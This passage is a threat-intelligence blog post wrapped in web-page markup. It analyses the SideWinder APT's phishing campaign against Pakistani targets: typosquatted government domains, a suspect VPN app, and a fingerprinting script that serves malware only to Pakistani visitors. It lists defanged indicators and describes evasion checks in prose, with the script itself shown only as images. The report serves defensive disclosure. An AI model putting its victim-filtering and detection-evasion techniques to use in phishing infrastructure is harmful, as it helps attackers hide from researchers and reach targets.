<form class="search-form" role="search" method="get" id="" action="https://www.group-ib.com/">
  <input type="search" placeholder="Search" name="s" id="search-input" value=""/>
  <button type="submit" class="search-button"><img src="/wp-content/themes/gib-theme/assets/images/search-icon.svg" alt="Search Icon"></button>

<style>
  .hidden {
    display: none;
  }
</style>

<script type="text/rocketlazyloadscript">
  const openSearchPopupBtns = [...document.querySelectorAll('.open-search-popup')];
  const closeSearchPopupBtns = [...document.querySelectorAll('.close-search-popup')];
  const searchPopup = document.querySelector('.search-popup');

  const closePopup = () => {
    searchPopup.style.display = 'none';
    openSearchPopupBtns.forEach(btn => btn.classList.remove('hidden'));
    closeSearchPopupBtns.forEach(btn => btn.classList.add('hidden'));
  };

  openSearchPopupBtns.forEach(openSearchPopupBtn => {
    openSearchPopupBtn.addEventListener('click', (e) => {
      e.preventDefault();

      searchPopup.style.display = 'block';
      openSearchPopupBtn.classList.add('hidden');
      closeSearchPopupBtns.forEach(btn => btn.classList.remove('hidden'));
    });
  });

  closeSearchPopupBtns.forEach(closeSearchPopupBtn => {
    closeSearchPopupBtn.addEventListener('click', () => {
      closePopup();
    });
  });

  document.addEventListener('click', (event) => {
    if (!searchPopup.contains(event.target) && !openSearchPopupBtns.some(btn => btn.contains(event.target)) && !closeSearchPopupBtns.some(btn => btn.contains(event.target))) {
      setTimeout(() => {
        if (!searchPopup.contains(event.target)) {
          closePopup();
        }
      }, 100);
    }
  });
</script>    </div>

                            <h1 class="header__title title-h2 mb-24 mt-md-48 mt-lg-64 mt-xl-64">SideWinder.AntiBot.Script</h1><p class="header__text mb-xs-48 mb-64 mb-lg-96 mb-xl-96">APT SideWinder’s new tool that narrows their reach to Pakistan</p><div class="post-info__date mb-24 mb-lg-32 mb-xl-48"><div class="body2">June 1, 2022 · <span id="reading-time"></span> min to read · Advanced Persistent Threats</div></div><div class="post-info__image mb-24 mb-lg-32 mb-xl-48"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/img-1440-24-min.jpg.webp" type="image/webp"><img data-no-lazy="" fetchpriority="high" src="https://www.group-ib.com/wp-content/uploads/img-1440-24-min.jpg" alt="" class="webpexpress-processed"></picture></div><div class="post-info__tags"><div class="post-info__tag body2">APT group</div><div class="post-info__tag body2">Pakistan</div><div class="post-info__tag body2">SideWinder</div><div class="post-info__tag body2">Threat Intelligence</div></div>                        </div>
                    </div>
                </div>
                <div class="blog-post-content" id="blog-post-content">
                    <div class="blog-post-content__section--text"><p>Group-IB Threat Intelligence researchers have discovered a new malicious infrastructure and a custom tool of the APT group <strong>SideWinder (aka Rattlesnake, Hardcore Nationalist, RAZOR TIGER, T-APT-04 and APT-C-17)</strong>, <a href="https://attack.mitre.org/groups/G0121/" target="_blank" rel="nofollow noopener">a threat actor that is believed to be originating from India and primarily targeting Pakistan.</a> The newly discovered custom tool, codenamed SideWinder.AntiBot.Script, is being used in the gang’s phishing attack against Pakistani targets. Group-IB Threat Intelligence team shares its findings so that security teams can more effectively identify SideWinder attacks.</p>
<h2>Antibot script &#8211; Key findings</h2>
<ul class="checks">
<li>Over the last year, Group-IB <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> system identified 92 IP addresses that have been used by SideWinder APT for phishing emails.</li>
<li>Pakistan remains the primary target for SideWinder. The attackers are especially interested in the Pakistani government organizations based on the discovered phishing document and public studies.</li>
<li>Phishing links in emails or posts that mimic legitimate notifications and services of government agencies and organizations in Pakistan are primary attack vectors of the gang.</li>
<li>SideWinder started using an anti-bot script to filter their victims &#8211; they are only interested in Pakistani users.</li>
<li>The group continues to distribute malicious files in ZIP archives with an LNK file inside, which downloads an HTA file from a remote server.</li>
<li>Upon discovery, Group-IB Threat Intelligence team notified relevant local authorities and shared its findings to make sure that the threat can be identified and contained at early stages.</li>
</ul>
<h2>SideWinder Profile</h2>
<p>The SideWinder APT (attlesnake, Hardcore Nationalist, RAZOR TIGER, T-APT-04 and APT-C-17) is believed to be an Indian nation-state threat actor.</p>
<p>In their attacks, SideWinder was seen targeting government, military, and economic sectors in Southeast Asia: in Afghanistan, Nepal, Sri Lanka, Bhutan, Myanmar, the Philippines, Bangladesh, Singapore, and China. However, since the discovery of the group in 2012, Pakistan has been the primary target of SideWinder. In the last year alone, several SideWinder’s attacks targeting Pakistan have been detected. SideWinder was particularly interested in the Pakistani military targets.</p>
<p>The Pakistani government even published an official <a href="https://cabinet.gov.pk/SiteImage/Misc/files/NTISB%20Advisories/2019/22-Advisory-No-22-2019.pdf" target="_blank" rel="nofollow noopener">advisory</a> about SideWinder <a href="https://download1.fbr.gov.pk/Docs/20204281542926630AdvisoryforRattlesnake.pdf" target="_blank" rel="noopener">activity</a>.</p>
<div id="attachment_20428" style="width: 711px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20428" decoding="async" class="wp-image-20428 size-full" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20701%20728'%3E%3C/svg%3E" alt="Fragment of the official notification about SideWinder’s attacks" width="701" height="728" data-lazy-src="https://www.group-ib.com/wp-content/uploads/1.webp" /><noscript><img aria-describedby="caption-attachment-20428" decoding="async" class="wp-image-20428 size-full" src="https://www.group-ib.com/wp-content/uploads/1.webp" alt="Fragment of the official notification about SideWinder’s attacks" width="701" height="728" /></noscript><p id="caption-attachment-20428" class="wp-caption-text">Image 1. Fragment of the official notification about SideWinder’s attacks</p></div>
<p>Group-IB researchers have repeatedly spotted phishing documents intended for Pakistani targets in public and private sector organizations.</p>
<p>For example, the following phishing document contains information about a proposal for a formal discussion of the impact of US withdrawal from Afghanistan on maritime security:</p>
<div id="attachment_20429" style="width: 834px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20429" decoding="async" class="size-full wp-image-20429" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20824%20821'%3E%3C/svg%3E" alt="Phishing document SHA-1" width="824" height="821" data-lazy-srcset="https://www.group-ib.com/wp-content/uploads/2.webp 824w, https://www.group-ib.com/wp-content/uploads/2-150x150.webp 150w" data-lazy-sizes="(max-width: 824px) 100vw, 824px" data-lazy-src="https://www.group-ib.com/wp-content/uploads/2.webp" /><noscript><img aria-describedby="caption-attachment-20429" decoding="async" class="size-full wp-image-20429" src="https://www.group-ib.com/wp-content/uploads/2.webp" alt="Phishing document SHA-1" width="824" height="821" srcset="https://www.group-ib.com/wp-content/uploads/2.webp 824w, https://www.group-ib.com/wp-content/uploads/2-150x150.webp 150w" sizes="(max-width: 824px) 100vw, 824px" /></noscript><p id="caption-attachment-20429" class="wp-caption-text">Image 2. Phishing document SHA-1: a74f9baa1791476c489942dd9e24c8c6fd0822cd</p></div>
<p>In addition, the group was seen cloning government websites to collect user credentials.</p>
<p>Below you can find a phishing page mimicking a government portal in Sri Lanka designed by SideWinder:</p>
<div id="attachment_20430" style="width: 672px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20430" decoding="async" class="wp-image-20430 size-full" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20662%20473'%3E%3C/svg%3E" alt="sidewinder group phishing page" width="662" height="473" data-lazy-src="https://www.group-ib.com/wp-content/uploads/3.webp" /><noscript><img aria-describedby="caption-attachment-20430" decoding="async" class="wp-image-20430 size-full" src="https://www.group-ib.com/wp-content/uploads/3.webp" alt="sidewinder group phishing page" width="662" height="473" /></noscript><p id="caption-attachment-20430" class="wp-caption-text">Image 3: Phishing page login panel &#8211; http://5.2.79[.]135/!/n/</p></div>
<div id="attachment_20461" style="width: 946px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20461" decoding="async" class="size-full wp-image-20461" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20936%20162'%3E%3C/svg%3E" alt="The attacker’s injector" width="936" height="162" data-lazy-src="https://www.group-ib.com/wp-content/uploads/image11.webp" /><noscript><img aria-describedby="caption-attachment-20461" decoding="async" class="size-full wp-image-20461" src="https://www.group-ib.com/wp-content/uploads/image11.webp" alt="The attacker’s injector" width="936" height="162" /></noscript><p id="caption-attachment-20461" class="wp-caption-text">Figure 3: The attacker’s injector</p></div>
<h2>SideWinder Network Infrastructure</h2>
<p>Over the last year, <strong>Group-IB’s Threat Intelligence solution detected 92 IP addresses used by SideWinder.</strong> The servers were automatically detected by Group-IB and Threat Intelligence users immediately received a proactive notification about the appearance of the new malicious infrastructure.</p>
<p>The analysis of the servers revealed that they were primarily used for phishing attacks. SideWinder’s phishing attacks will be covered later in the text in more detail.</p>
<p>Below is a summary of the server 2.56.245[.]21, one of Sidewinder’s servers. According to Group-IB data, the server has been in use by SideWinder since at least January 22, 2022.</p>
<p><div id="attachment_20431" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20431" decoding="async" class="wp-image-20431 size-full" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%20975'%3E%3C/svg%3E" alt="sidewinder group Network Indicators" width="1600" height="975" data-lazy-src="https://www.group-ib.com/wp-content/uploads/4.webp" /><noscript><img aria-describedby="caption-attachment-20431" decoding="async" class="wp-image-20431 size-full" src="https://www.group-ib.com/wp-content/uploads/4.webp" alt="sidewinder group Network Indicators" width="1600" height="975" /></noscript><p id="caption-attachment-20431" class="wp-caption-text">Image 4: Network Indicators related to 2.56.245[.]21 Source: Group-IB Threat Intelligence</p></div>Thanks to Group-IB’s Network Graph Analysis tool, shown above, it was possible to discover that this address is used as the A-record for the following domains:</p>
<ul>
<li><em>finance.pakgov[.]net;</em></li>
<li><em>vpn.pakgov[.]net;</em></li>
<li><em>csd.pakgov[.]net;</em></li>
<li><em>hajj.pakgov[.]net;</em></li>
<li><em>nadra.pakgov[.]net;</em></li>
<li><em>pt.pakgov[.]net;</em></li>
<li><em>flix.pakgov[.]net;</em></li>
<li><em>covid.pakgov[.]net.</em></li>
</ul>
<p>As you may have guessed, these are all phishing domains mimicking legitimate domains of Pakistani governmental and non-governmental institutions, such as <em>finance.gov.pk</em>.</p>
<div id="attachment_20432" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20432" decoding="async" class="size-full wp-image-20432" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201000'%3E%3C/svg%3E" alt="fragment of the network infrastructure" width="1600" height="1000" data-lazy-src="https://www.group-ib.com/wp-content/uploads/5.webp" /><noscript><img aria-describedby="caption-attachment-20432" decoding="async" class="size-full wp-image-20432" src="https://www.group-ib.com/wp-content/uploads/5.webp" alt="fragment of the network infrastructure" width="1600" height="1000" /></noscript><p id="caption-attachment-20432" class="wp-caption-text">Image 5. A fragment of the network infrastructure associated with the SideWinder group. Source: Group-IB Threat Intelligence</p></div>
<h2>Phishing categorization</h2>
<p>Each of the previously mentioned servers detected by Group-IB Threat Intelligence system mimic the public services related to Pakistan. Some of them are:</p>

</div></div></div><div class="blog-post-content__section--text"><p>While investigating these malicious domains, Group-IB researchers found a phishing link &#8211; &#8220;<em>vpn.pakgov[.]net/Download-3b00fd1a</em>&#8221; &#8211; which redirects to a legitimate domain &#8220;<em>securevpn.com</em>&#8220;. This may indicate a temporary suspension of the malicious campaign or conversely the link could redirect to a malicious site in the future as part of a different campaign.</p>
<div id="attachment_20433" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20433" decoding="async" class="size-full wp-image-20433" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%20314'%3E%3C/svg%3E" alt="Screenshot with redirect to legitimate securevpn.com" width="1600" height="314" data-lazy-src="https://www.group-ib.com/wp-content/uploads/6.webp" /><noscript><img aria-describedby="caption-attachment-20433" decoding="async" class="size-full wp-image-20433" src="https://www.group-ib.com/wp-content/uploads/6.webp" alt="Screenshot with redirect to legitimate securevpn.com" width="1600" height="314" /></noscript><p id="caption-attachment-20433" class="wp-caption-text">Image 6. Screenshot with redirect to legitimate securevpn.com</p></div>
<p>Also among the discovered phishing links, Group-IB researchers found a link that downloaded an application from the official Google Play store <a href="https://web.archive.org/web/20220520104931/https://play.google.com/store/apps/details?id=com.securedata.vpn" rel="nofollow">called</a> &#8220;<em>SecureVPN</em>&#8220;.</p>
<div id="attachment_20434" style="width: 508px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20434" decoding="async" class="size-full wp-image-20434" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20498%20753'%3E%3C/svg%3E" alt="Screenshot from the Google Play store" width="498" height="753" data-lazy-src="https://www.group-ib.com/wp-content/uploads/7.webp" /><noscript><img aria-describedby="caption-attachment-20434" decoding="async" class="size-full wp-image-20434" src="https://www.group-ib.com/wp-content/uploads/7.webp" alt="Screenshot from the Google Play store" width="498" height="753" /></noscript><p id="caption-attachment-20434" class="wp-caption-text">Image 7. Screenshot from the Google Play store</p></div>
<p>The app in question looks suspicious: it has only 10+ downloads. It was published by the author, “ross jack”, with only one project. Furthermore, the description of the application was copied from NordVPN&#8217;s <a href="https://microsoftedge.microsoft.com/addons/detail/nordvpn-%E2%80%93-vpn-proxy-for-p/fphgeikpdcdcheaochkhldmnfblfogla" target="_blank" rel="nofollow noopener">description</a>:</p>
<div id="attachment_20435" style="width: 1036px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20435" decoding="async" class="size-full wp-image-20435" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201026%20827'%3E%3C/svg%3E" alt="Screenshot from the Microsoft Edge extension store" width="1026" height="827" data-lazy-src="https://www.group-ib.com/wp-content/uploads/8.webp" /><noscript><img aria-describedby="caption-attachment-20435" decoding="async" class="size-full wp-image-20435" src="https://www.group-ib.com/wp-content/uploads/8.webp" alt="Screenshot from the Microsoft Edge extension store" width="1026" height="827" /></noscript><p id="caption-attachment-20435" class="wp-caption-text">Image 8. Screenshot from the Microsoft Edge extension store</p></div>
<p>Therefore, Group-IB researchers assume that the application most likely mimics the legitimate <a href="https://play.google.com/store/apps/details?id=com.securevpn.securevpn" target="_blank" rel="nofollow noopener">Secure VPN application</a> of the same name. At runtime, this application performs the following requests:</p>
<ul>
<li>hXXps://api.vpn-secure[.]co/secureVpn/;</li>
<li>hXXps://api.vpn-secure[.]co/secureVpn/register;</li>
</ul>
<p>However, at the time of the research, they were unavailable, and a request to the root of the page redirects to the legitimate NordVPN domain.</p>
<p><div id="attachment_20436" style="width: 554px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20436" decoding="async" class="wp-image-20436 size-full" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20544%20744'%3E%3C/svg%3E" alt="Request to the root of the api.vpn-secure[.]co" width="544" height="744" data-lazy-src="https://www.group-ib.com/wp-content/uploads/9.webp" /><noscript><img aria-describedby="caption-attachment-20436" decoding="async" class="wp-image-20436 size-full" src="https://www.group-ib.com/wp-content/uploads/9.webp" alt="Request to the root of the api.vpn-secure[.]co" width="544" height="744" /></noscript><p id="caption-attachment-20436" class="wp-caption-text">Image 9. Request to the root of the api.vpn-secure[.]co</p></div>In 2020, Trend Micro researchers <a href="https://www.trendmicro.com/en_us/research/20/a/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group.html" target="_blank" rel="nofollow noopener">found similar malicious apps</a> that were attributed to the SideWinder group. These apps were also uploaded to the Google Play Store.It is worth noting that at the time of writing we cannot confirm if the Secure VPN app developed by &#8220;ross jack&#8221; is 100% malicious. This research is ongoing.</p>
<h2>Kill Chain</h2>
<p>In this section we will take a closer look at the infection chain.</p>
<p>As in previous SideWinder’s attacks, it all starts with a phishing link:</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="gallery swiper gallery-swiper-816"><div class="swiper-wrapper"><div class="swiper-slide gallery__item wp-caption"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Screenshot with an example of a malicious email" title="10" data-lazy-src="https://www.group-ib.com/wp-content/uploads/10.webp"><noscript><img src="https://www.group-ib.com/wp-content/uploads/10.webp" alt="Screenshot with an example of a malicious email" title="10"></noscript><p class="small wp-caption-text">Image 10. Screenshot with an example of a malicious email</p></div><div class="swiper-slide gallery__item wp-caption"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Screenshot with an example of a malicious email" title="11" data-lazy-src="https://www.group-ib.com/wp-content/uploads/11.webp"><noscript><img src="https://www.group-ib.com/wp-content/uploads/11.webp" alt="Screenshot with an example of a malicious email" title="11"></noscript><p class="small wp-caption-text">Image 11. Screenshot with an example of a malicious email</p></div><div class="swiper-slide gallery__item wp-caption"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="Screenshot with an example of a malicious email" title="12" data-lazy-src="https://www.group-ib.com/wp-content/uploads/12.webp"><noscript><img src="https://www.group-ib.com/wp-content/uploads/12.webp" alt="Screenshot with an example of a malicious email" title="12"></noscript><p class="small wp-caption-text">Image 12. Screenshot with an example of a malicious email</p></div></div><div class="swiper-pagination"></div><div class="swiper-button-next"></div><div class="swiper-button-prev"></div></div></div>

                  <div class="blog-post-content__section--text"><p>Group-IB researchers also found malicious links posted on Facebook:</p>
<div id="attachment_20440" style="width: 504px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20440" decoding="async" class="size-full wp-image-20440" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20494%20172'%3E%3C/svg%3E" alt="Screenshot of a malicious link on Facebook" width="494" height="172" data-lazy-src="https://www.group-ib.com/wp-content/uploads/13.webp" /><noscript><img aria-describedby="caption-attachment-20440" decoding="async" class="size-full wp-image-20440" src="https://www.group-ib.com/wp-content/uploads/13.webp" alt="Screenshot of a malicious link on Facebook" width="494" height="172" /></noscript><p id="caption-attachment-20440" class="wp-caption-text">Image 13. Screenshot of a malicious link on Facebook</p></div>
<p>Once the victim clicks on the link, an archive with a malicious .LNK file or RTF document is downloaded. In the case of LNK, the files have a Microsoft Word icon, making it appear more legitimate, encouraging people to open. Whether the initial vector was a phishing email or a phishing link posted on social media, the malicious payload is always launched using the DLL side-loading technique, which provides persistence and has RAT functionality.</p>
<h3>SideWinder.AntiBot.Script</h3>
<p>As soon as the recipient clicks on the link, <strong>the new tool, dubbed SideWinder.AntiBot.Script by Group-IB researchers, comes into play.</strong> The script checks the client browser environment and, based on several parameters, decides whether to issue a malicious file or redirect to a legitimate resource.</p>
<p>For example, let&#8217;s take finance.pakgov[.]net which we have described a little already. The phishing link appears as follows &#8211; <em>hxxps://finance.pakgov[.]net/salary-a4222e91.</em></p>
<p>Let&#8217;s first see what happens if we try to follow this link with settings different from a typical Pakistani user.</p>
<p><div id="attachment_20441" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20441" decoding="async" class="size-full wp-image-20441" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%20384'%3E%3C/svg%3E" alt="Screenshot with request and redirect" width="1600" height="384" data-lazy-src="https://www.group-ib.com/wp-content/uploads/14.webp" /><noscript><img aria-describedby="caption-attachment-20441" decoding="async" class="size-full wp-image-20441" src="https://www.group-ib.com/wp-content/uploads/14.webp" alt="Screenshot with request and redirect" width="1600" height="384" /></noscript><p id="caption-attachment-20441" class="wp-caption-text">Image 14. Screenshot with hxxps://finance.pakgov[.]net/salary-a4222e91 request and redirect to legitimate finance.gov.pk</p></div>As you can see in the screenshot above, when a client visits this link, which the anti-bot script does not like, the script redirects to a legitimate document located on a legitimate resource: <em>finance.gov.pk</em>. And, the script won&#8217;t even work if the client&#8217;s IP address differs from Pakistan&#8217;s &#8211; the client will automatically be redirected to the legitimate resource. These are common techniques that are used to avoid detection by threat researchers.</p>
<div id="attachment_20442" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20442" decoding="async" class="size-full wp-image-20442" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201089'%3E%3C/svg%3E" alt="Redirect to a legitimate document." width="1600" height="1089" data-lazy-src="https://www.group-ib.com/wp-content/uploads/15.webp" /><noscript><img aria-describedby="caption-attachment-20442" decoding="async" class="size-full wp-image-20442" src="https://www.group-ib.com/wp-content/uploads/15.webp" alt="Redirect to a legitimate document." width="1600" height="1089" /></noscript><p id="caption-attachment-20442" class="wp-caption-text">Image 15. Redirect to a legitimate document.</p></div>
<p>However, if you follow a link with an IP address from Pakistan, the anti-bot script will work.</p>
<div id="attachment_20443" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20443" decoding="async" class="size-full wp-image-20443" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201034'%3E%3C/svg%3E" alt="SideWinder.AntiBot.Script snippet" width="1600" height="1034" data-lazy-src="https://www.group-ib.com/wp-content/uploads/16.webp" /><noscript><img aria-describedby="caption-attachment-20443" decoding="async" class="size-full wp-image-20443" src="https://www.group-ib.com/wp-content/uploads/16.webp" alt="SideWinder.AntiBot.Script snippet" width="1600" height="1034" /></noscript><p id="caption-attachment-20443" class="wp-caption-text">Image 16. SideWinder.AntiBot.Script snippet (the full version of the script is available below in the list of compromise indicators)</p></div>
<p>To begin with, the CAPTCHA page immediately catches the eye. While the user is waiting, the client&#8217;s browser is profiled to give the final verdict.</p>
<div id="attachment_20444" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20444" decoding="async" class="size-full wp-image-20444" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201022'%3E%3C/svg%3E" alt="Screenshot of fake CloudFlare page" width="1600" height="1022" data-lazy-src="https://www.group-ib.com/wp-content/uploads/17.webp" /><noscript><img aria-describedby="caption-attachment-20444" decoding="async" class="size-full wp-image-20444" src="https://www.group-ib.com/wp-content/uploads/17.webp" alt="Screenshot of fake CloudFlare page" width="1600" height="1022" /></noscript><p id="caption-attachment-20444" class="wp-caption-text">Image 17. Screenshot of fake CloudFlare page</p></div>
<p>If the client does not pass the anti-bot script filtering, for example, by the parameter of the operating system used, then a corresponding message will be displayed.</p>
<div id="attachment_20445" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20445" decoding="async" class="size-full wp-image-20445" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201014'%3E%3C/svg%3E" alt="Screenshot of the platform compatibility error" width="1600" height="1014" data-lazy-src="https://www.group-ib.com/wp-content/uploads/18.webp" /><noscript><img aria-describedby="caption-attachment-20445" decoding="async" class="size-full wp-image-20445" src="https://www.group-ib.com/wp-content/uploads/18.webp" alt="Screenshot of the platform compatibility error" width="1600" height="1014" /></noscript><p id="caption-attachment-20445" class="wp-caption-text">Image 18. Screenshot of the platform compatibility error</p></div>
<h3>Detection of a client&#8217;s browser environment</h3>
<p>The script is written to collect everything it can reach to verify that the user is not a researcher or passerby on the internet:</p>
<ul>
<li><em>Geo-position &#8211; check</em>;</li>
</ul>
<div id="attachment_20446" style="width: 1368px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20446" decoding="async" class="size-full wp-image-20446" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201358%20452'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1358" height="452" data-lazy-src="https://www.group-ib.com/wp-content/uploads/19.webp" /><noscript><img aria-describedby="caption-attachment-20446" decoding="async" class="size-full wp-image-20446" src="https://www.group-ib.com/wp-content/uploads/19.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1358" height="452" /></noscript><p id="caption-attachment-20446" class="wp-caption-text">Image 19. A snippet of SideWinder.AntiBot.Script</p></div>
<ul>
<li>Version of the operating system &#8211; check;</li>
<li>Data about the user agent &#8211; check;</li>
<li>System language settings &#8211; check;</li>
<li>The number of logical processors &#8211; check;</li>
<li>Accessing the <a href="https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer" target="_blank" rel="nofollow noopener">CredentialsContainer</a> interface, which can return saved passwords from the browser if the necessary function is called. (not used);</li>
</ul>
<div id="attachment_20447" style="width: 1072px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20447" decoding="async" class="size-full wp-image-20447" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201062%20838'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1062" height="838" data-lazy-src="https://www.group-ib.com/wp-content/uploads/20.webp" /><noscript><img aria-describedby="caption-attachment-20447" decoding="async" class="size-full wp-image-20447" src="https://www.group-ib.com/wp-content/uploads/20.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1062" height="838" /></noscript><p id="caption-attachment-20447" class="wp-caption-text">Image 20. A snippet of SideWinder.AntiBot.Script</p></div>
<ul>
<li>A feature that avoids automatic analysis using the Headless version of Chrome &#8211; check;</li>
</ul>
<div id="attachment_20448" style="width: 1172px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20448" decoding="async" class="size-full wp-image-20448" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201162%20774'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1162" height="774" data-lazy-src="https://www.group-ib.com/wp-content/uploads/21.webp" /><noscript><img aria-describedby="caption-attachment-20448" decoding="async" class="size-full wp-image-20448" src="https://www.group-ib.com/wp-content/uploads/21.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1162" height="774" /></noscript><p id="caption-attachment-20448" class="wp-caption-text">Image 21. A snippet of SideWinder.AntiBot.Script</p></div>
<ul>
<li>A list of possible video cards used and checking their compliance with the screen size. (Images 22 and 23):</li>
</ul>
</div>
                            
                            <div class="blog-post-content__section"><div class="gallery swiper gallery-swiper-703"><div class="swiper-wrapper"><div class="swiper-slide gallery__item wp-caption"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" title="22" data-lazy-src="https://www.group-ib.com/wp-content/uploads/22.webp"><noscript><img src="https://www.group-ib.com/wp-content/uploads/22.webp" alt="A snippet of SideWinder.AntiBot.Script" title="22"></noscript><p class="small wp-caption-text">Image 22.                   <div class="blog-post-content__section--text"><div id="attachment_20451" style="width: 1038px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20451" decoding="async" class="size-full wp-image-20451" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201028%20734'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1028" height="734" data-lazy-src="https://www.group-ib.com/wp-content/uploads/24.webp" /><noscript><img aria-describedby="caption-attachment-20451" decoding="async" class="size-full wp-image-20451" src="https://www.group-ib.com/wp-content/uploads/24.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1028" height="734" /></noscript><p id="caption-attachment-20451" class="wp-caption-text">Image 24. <ul>
<li>Check for compliance with operating systems from the list:</li>
</ul>
<div id="attachment_20452" style="width: 1220px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20452" decoding="async" class="size-full wp-image-20452" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201210%20454'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1210" height="454" data-lazy-src="https://www.group-ib.com/wp-content/uploads/25.webp" /><noscript><img aria-describedby="caption-attachment-20452" decoding="async" class="size-full wp-image-20452" src="https://www.group-ib.com/wp-content/uploads/25.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1210" height="454" /></noscript><p id="caption-attachment-20452" class="wp-caption-text">Image 25. A snippet of SideWinder.AntiBot.Script</p></div>
<ul>
<li>And most importantly, the function of issuing a malicious file and the function to redirect to a legitimate resource.</li>
</ul>
<div id="attachment_20453" style="width: 1610px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-20453" decoding="async" class="size-full wp-image-20453" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201600%201049'%3E%3C/svg%3E" alt="A snippet of SideWinder.AntiBot.Script" width="1600" height="1049" data-lazy-src="https://www.group-ib.com/wp-content/uploads/26.webp" /><noscript><img aria-describedby="caption-attachment-20453" decoding="async" class="size-full wp-image-20453" src="https://www.group-ib.com/wp-content/uploads/26.webp" alt="A snippet of SideWinder.AntiBot.Script" width="1600" height="1049" /></noscript><p id="caption-attachment-20453" class="wp-caption-text">Image 26. A snippet of SideWinder.AntiBot.Script</p></div>
<p>However, in another script found on another malicious domain &#8211; finance.govpk-mail[.]net &#8211; the redirect function still led to a link with a payload:</p>
